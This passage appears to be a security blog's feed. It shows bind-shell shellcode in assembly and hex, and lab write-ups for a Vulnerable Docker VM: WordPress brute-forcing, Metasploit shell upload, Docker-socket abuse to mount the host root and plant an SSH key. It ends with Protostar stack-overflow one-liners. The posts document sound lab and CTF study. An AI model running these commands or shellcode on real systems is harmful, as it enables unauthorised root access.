</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>          <span class="o">=</span> 0
</span></code></pre></td></tr></table></div></figure>


<p>Having the <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> call would result in an increase of <strong>16 bytes</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'><span class="gd">--- ../../0x01-bind/bind.asm.in 2018-05-21 00:35:48.689635600 +0100</span>
</span><span class='line'><span class="gi">+++ setsockopt.asm      2018-05-21 00:41:40.340303200 +0100</span>
</span><span class='line'><span class="gu">@@ -1,9 +1,12 @@</span>
</span><span class='line'><span class="gi">+; Like the bind shell but with a call to setsockopt(2). Allows a server to bind</span>
</span><span class='line'><span class="gi">+; to a port even if there are previously established connections. Also useful</span>
</span><span class='line'><span class="gi">+; when there are multiple local aliased IP addresses listening on the same port.</span>
</span><span class='line'><span class="gi">+</span>
</span><span class='line'> global _start
</span><span class='line'>
</span><span class='line'> section .text
</span><span class='line'> _start:
</span><span class='line'>        xor eax, eax
</span><span class='line'><span class="gd">-       xor esi, esi            ; will always hold the value 0</span>
</span><span class='line'>        cdq                     ; set edx to zero as well, by sign extending eax
</span><span class='line'>
</span><span class='line'>        mov ax, 0x167           ; use mov instead of push imm16 and pop r16
</span><span class='line'><span class="gu">@@ -15,7 +18,18 @@</span>
</span><span class='line'>        ; edx (protocol) initialized to zero by the cdq instruction above
</span><span class='line'>        int 0x80
</span><span class='line'>
</span><span class='line'><span class="gi">+       xchg edx, ebx           ; SO_REUSEADDR</span>
</span><span class='line'>        xchg ebx, eax           ; fd on ebx from this point below
</span><span class='line'><span class="gi">+       mov ax, 0x16e           ; use mov instead of push imm16 and pop r16</span>
</span><span class='line'><span class="gi">+       ; int setsockopt(int, int, int, const void *, socklen_t)</span>
</span><span class='line'><span class="gi">+       ; ecx (level) is already 1 from the above socket(2) call</span>
</span><span class='line'><span class="gi">+       push 0x1                ; enabled</span>
</span><span class='line'><span class="gi">+       mov esi, esp            ; optval</span>
</span><span class='line'><span class="gi">+       push 0x4                ; 4 bytes</span>
</span><span class='line'><span class="gi">+       pop edi                 ; optlen</span>
</span><span class='line'><span class="gi">+       int 0x80</span>
</span><span class='line'><span class="gi">+</span>
</span><span class='line'><span class="gi">+       xor esi, esi            ; will always hold the value 0</span>
</span><span class='line'>        mov ax, 0x169           ; use mov instead of push imm16 and pop r16
</span><span class='line'>        ; int bind(int, const struct sockaddr *, socklen_t)
</span><span class='line'>        push esi                ; INADDR_ANY
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-compile setsockopt.asm
</span><span class='line'><span class="nv">$ </span>asm-opcodes setsockopt
</span><span class='line'>Shellcode size: <span class="m">98</span>
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>87<span class="se">\x</span>d3<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6e<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>6a<span class="se">\x</span>04<span class="se">\x</span>5f<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>69<span class="se">\x</span>01<span class="se">\x</span>56<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>
</span><span class='line'>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6b<span class="se">\x</span>01<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>f7<span class="se">\x</span>e1<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6c<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>41<span class="se">\x</span>41<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>56<span class="se">\x</span>68<span class="se">\x</span>6e
</span><span class='line'><span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulnerable Docker VM: Hard]]></title>
    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard/"/>
    <updated>2017-11-01T11:20:17+00:00</updated>
    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-hard</id>
    <content type="html"><![CDATA[<p>Since this is running WordPress, the standard WPScan flags to enumerate
information were used. Nothing relevant popped besides its users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
</span><span class='line'><span class="go">[+] Enumerating usernames ...</span>
</span><span class='line'><span class="go">[+] Identified the following 1 user/s:</span>
</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
</span><span class='line'><span class="go">    | Id | Login | Name            |</span>
</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
</span><span class='line'><span class="go">    | 1  | bob   | bob _ NotSoEasy |</span>
</span><span class='line'><span class="go">    +----+-------+-----------------+</span>
</span><span class='line'><span class="go">[snip]</span>
</span></code></pre></td></tr></table></div></figure>


<p>With this, brute-forcing seemed the next logical step. Used the rockyou wordlist
to obtain the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">[snip]</span>
</span><span class='line'><span class="go">+----+-------+------+----------+</span>
</span><span class='line'><span class="go">| Id | Login | Name | Password |</span>
</span><span class='line'><span class="go">+----+-------+------+----------+</span>
</span><span class='line'><span class="go">|    | bob   |      | Welcome1 |</span>
</span><span class='line'><span class="go">+----+-------+------+----------+</span>
</span><span class='line'><span class="go">[snip]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Logging in reveals the first flag in a WordPress draft:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998</span>
</span><span class='line'><span class="go">[snip]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Decided with using Metasploit for an interactive shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">msf &gt; use exploit/unix/webapp/wp_admin_shell_upload</span>
</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set password Welcome1</span>
</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rhost ...</span>
</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set rport 8000</span>
</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; set user bob</span>
</span><span class='line'><span class="go">msf exploit(wp_admin_shell_upload) &gt; run</span>
</span></code></pre></td></tr></table></div></figure>


<p>After unsuccessfully scouring the Web for an exploit that affected this kernel
version, tried to horizontally escalate privileges by finding containers on the
same user-defined network. To obtain more reliable results, a statically
compiled nmap was sent to the machine to perform a ping sweep and a TCP scan.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 09:46 UTC</span>
</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
</span><span class='line'><span class="go">Host is up (0.00053s latency).</span>
</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
</span><span class='line'><span class="go">Host is up (0.00040s latency).</span>
</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
</span><span class='line'><span class="go">Host is up (0.00029s latency).</span>
</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
</span><span class='line'><span class="go">Host is up (0.00025s latency).</span>
</span><span class='line'><span class="go">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.97 seconds</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Starting Nmap 7.11 ( https://nmap.org ) at 2017-11-01 10:02 UTC</span>
</span><span class='line'><span class="go">Cannot find nmap-payloads. UDP payloads are disabled.</span>
</span><span class='line'><span class="go">Nmap scan report for 172.18.0.1</span>
</span><span class='line'><span class="go">Host is up (0.00016s latency).</span>
</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
</span><span class='line'><span class="go">22/tcp   open  ssh</span>
</span><span class='line'><span class="go">8000/tcp open  http-alt</span>
</span><span class='line'>
</span><span class='line'><span class="go">Nmap scan report for content_db_1.content_default (172.18.0.2)</span>
</span><span class='line'><span class="go">Host is up (0.00049s latency).</span>
</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
</span><span class='line'><span class="go">3306/tcp open  mysql</span>
</span><span class='line'>
</span><span class='line'><span class="go">Nmap scan report for content_ssh_1.content_default (172.18.0.3)</span>
</span><span class='line'><span class="go">Host is up (0.00047s latency).</span>
</span><span class='line'><span class="go">Not shown: 65533 closed ports</span>
</span><span class='line'><span class="go">PORT     STATE SERVICE</span>
</span><span class='line'><span class="go">22/tcp   open  ssh</span>
</span><span class='line'><span class="go">8022/tcp open  oa-system</span>
</span><span class='line'>
</span><span class='line'><span class="go">Nmap scan report for 8f4bca8ef241 (172.18.0.4)</span>
</span><span class='line'><span class="go">Host is up (0.00015s latency).</span>
</span><span class='line'><span class="go">Not shown: 65534 closed ports</span>
</span><span class='line'><span class="go">PORT   STATE SERVICE</span>
</span><span class='line'><span class="go">80/tcp open  http</span>
</span><span class='line'>
</span><span class='line'><span class="go">Nmap done: 4 IP addresses (4 hosts up) scanned in 6.19 seconds</span>
</span></code></pre></td></tr></table></div></figure>


<p>Scanning revealed a potential target with port 8022/tcp open. Reaching it is
possible with meterpreter port-forwarding:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">meterpreter &gt; portfwd add -l 8192 -p 8022 -r 172.18.0.3</span>
</span></code></pre></td></tr></table></div></figure>


<p>Accessing it on a browser spawns a shell on the DB container as root. While
enumerating this new container, noticed that the Docker socket is available in
the /var/run directory, thus, giving full control of the daemon on the host.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ id</span>
</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since the vulnerable Virtual Machine wasn&rsquo;t started with NAT configured, to
interact with the UNIX domain socket, a locally and statically compiled cURL
was sent as base64 to the remote machine as a WordPress draft and extracted
with the MySQL client:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ mysql -h 127.0.0.1 -u wordpress                                 \</span>
</span><span class='line'><span class="go">    -e &#39;select post_content from wordpress.wp_posts where ID = 151&#39; \</span>
</span><span class='line'><span class="go">    -p &gt;curl</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next a container with a host bind mount was created and started by using the
REST API:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
</span><span class='line'><span class="go">    -d &#39;{ &quot;Image&quot;: &quot;wordpress:latest&quot;, &quot;AttachStdin&quot;: true,          \</span>
</span><span class='line'><span class="go">    &quot;Tty&quot;: true, &quot;Entrypoint&quot;: [ &quot;/bin/sh&quot;, &quot;-c&quot; ], &quot;HostConfig&quot;: {  \</span>
</span><span class='line'><span class="go">    &quot;Binds&quot;: [ &quot;/:/srv&quot; ] }, &quot;Cmd&quot;: [ &quot;sh &quot; ] }&#39;                     \</span>
</span><span class='line'><span class="go">    http:/v1.24/containers/create?name=docker-root</span>
</span><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPOST                   \</span>
</span><span class='line'><span class="go">    -H &#39;Content-Type: application/json&#39;                              \</span>
</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/start</span>
</span></code></pre></td></tr></table></div></figure>


<p>With a container created with full access to the host root directory under /srv,
it is only a matter of creating a tarball with a SSH public key (which can be
uploaded using the same method as above):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">/ $ curl --unix-socket /var/run/docker.sock -XPUT                     \</span>
</span><span class='line'><span class="go">    --upload-file key.tar                                             \</span>
</span><span class='line'><span class="go">    http:/v1.24/containers/docker-root/archive?path=/srv/root/.ssh</span>
</span></code></pre></td></tr></table></div></figure>


<p>Connecting via SSH on the externally standard available port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:/#</span> id
</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 flag_3
</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulnerable Docker VM: Easy]]></title>
    <link href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/"/>
    <updated>2017-11-01T10:58:32+00:00</updated>
    <id>http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy</id>
    <content type="html"><![CDATA[<p>Scanning with nmap reveals that the host is exposing the Docker daemon on port
2375/tcp. Connecting and interacting with it is possible:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> <span class="nb">export </span><span class="nv">DOCKER_HOST</span><span class="o">=</span>tcp://172.19.0.108:2375
</span><span class='line'><span class="gp">#</span> docker version
</span><span class='line'><span class="go">Client:</span>
</span><span class='line'><span class="go"> Version:      17.05.0-ce</span>
</span><span class='line'><span class="go"> API version:  1.29</span>
</span><span class='line'><span class="go"> Go version:   go1.8.1</span>
</span><span class='line'><span class="go"> Git commit:   v17.05.0-ce</span>
</span><span class='line'><span class="go"> Built:        Tue May 16 10:10:15 2017</span>
</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
</span><span class='line'>
</span><span class='line'><span class="go">Server:</span>
</span><span class='line'><span class="go"> Version:      17.06.0-ce</span>
</span><span class='line'><span class="go"> API version:  1.30 (minimum version 1.12)</span>
</span><span class='line'><span class="go"> Go version:   go1.8.3</span>
</span><span class='line'><span class="go"> Git commit:   02c1d87</span>
</span><span class='line'><span class="go"> Built:        Fri Jun 23 21:17:13 2017</span>
</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
</span><span class='line'><span class="go"> Experimental: false</span>
</span></code></pre></td></tr></table></div></figure>


<p>Having direct access to the daemon is a big no-no. This gives the ability to
execute any commands on the remote daemon, like creating a new container and
taking advantage of the shared filesystem (-v) functionality, by bind-mounting
the host root directory and having access to all of its files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> docker run -v /:/srv -it --rm wordpress:latest bash
</span><span class='line'><span class="gp">root@23890602df34:/var/www/html#</span> ls -l /srv
</span><span class='line'><span class="go">total 80</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 bin</span>
</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 22 14:11 boot</span>
</span><span class='line'><span class="go">drwxr-xr-x  14 root root  4080 Nov  1 10:26 dev</span>
</span><span class='line'><span class="go">drwxr-xr-x  90 root root  4096 Nov  1 10:26 etc</span>
</span><span class='line'><span class="go">-r--------   1 root root   414 Aug 21 20:30 flag_3</span>
</span><span class='line'><span class="go">drwxr-xr-x   4 root root  4096 Aug 16 05:56 home</span>
</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    34 Aug 16 08:30 initrd.img -&gt; boot/initrd.img-3.13.0-128-generic</span>
</span><span class='line'><span class="go">drwxr-xr-x  21 root root  4096 Aug 16 06:36 lib</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 06:36 lib64</span>
</span><span class='line'><span class="go">drwx------   2 root root 16384 Aug 14 08:02 lost+found</span>
</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 14 08:03 media</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 opt</span>
</span><span class='line'><span class="go">dr-xr-xr-x 108 root root     0 Nov  1 10:26 proc</span>
</span><span class='line'><span class="go">drwx------   4 root root  4096 Aug 22 14:19 root</span>
</span><span class='line'><span class="go">drwxr-xr-x  19 root root   700 Nov  1 10:26 run</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 sbin</span>
</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 srv</span>
</span><span class='line'><span class="go">dr-xr-xr-x  13 root root     0 Nov  1 10:26 sys</span>
</span><span class='line'><span class="go">drwxrwxrwt   2 root root  4096 Nov  1 10:30 tmp</span>
</span><span class='line'><span class="go">drwxr-xr-x  10 root root  4096 Aug 14 08:02 usr</span>
</span><span class='line'><span class="go">drwxr-xr-x  12 root root  4096 Aug 14 08:12 var</span>
</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    31 Aug 16 08:30 vmlinuz -&gt; boot/vmlinuz-3.13.0-128-generic</span>
</span></code></pre></td></tr></table></div></figure>


<p>Since when running nmap revealed that the host is also making use of SSH, having
the host root directory mapped, it&rsquo;s only a matter of generating a key and
logging in to get root on the compromised host:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:~#</span> id
</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 /flag_3
</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack]]></title>
    <link href="http://tcunha.github.io/blog/2015/12/29/protostar-stack/"/>
    <updated>2015-12-29T18:58:57+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/12/29/protostar-stack</id>
    <content type="html"><![CDATA[<h2>stack0</h2>

<p>Nice refresher with regards to the volatile type qualifier. It is needed to
prevent the compiler from optimizing it away, given that it&rsquo;s &ldquo;always&rdquo; set to
zero (it might remove the if condition altogether). This is specially true for
signal handlers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">sig_atomic_t</span>    <span class="n">quit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="cm">/* Needs volatile! */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span>
</span><span class='line'><span class="nf">sigterm</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">quit</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* This might be transformed to while (true). */</span>
</span><span class='line'>  <span class="p">...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Given that the buffer is 64 bytes in size and the stack layout, writing one more
will copy one over modified:</p>

<pre><code>H +-------------+
  | ...         |
  | modified    |
  | buffer[64]  |   /* Being power of two means that it's aligned. */
  | ...         |
L +-------------+
</code></pre>

<p>To trigger the condition, the following command can be issued:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;1&quot; * 65&#39;</span><span class="p">|</span>./stack0
</span><span class='line'><span class="go">you have changed the &#39;modified&#39; variable</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack1</h2>

<p>Like the above, given that the address of modified is four bytes above the
buffer and (like the exercise says) by taking into account that this is a little
endian platform (i386):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x64\x63\x62\x61&quot;&#39;</span><span class="sb">`</span>  <span class="c"># or,</span>
</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
</span><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;dcba&quot;&#39;</span><span class="sb">`</span>
</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack2</h2>

<p>The same as the last one but with an environment variable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
